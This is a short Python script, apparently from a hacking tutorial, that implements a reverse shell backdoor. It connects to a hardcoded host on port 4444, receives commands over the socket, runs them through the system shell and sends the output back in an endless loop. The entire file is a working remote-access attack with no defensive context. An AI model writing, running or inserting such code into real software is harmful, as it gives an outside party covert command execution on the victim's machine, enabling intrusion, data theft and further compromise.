import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command,shell=True)


# create socket object, and call a method connect
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# args are destination ip, listening port
connection.connect(("10.0.0.0", 4444))
connection.send("\n[+] Connection established\n")

while True:
    command = connection.recv(1024)
    command_result = execute_system_command((command))
    connection.send(command_result)

connection.close()
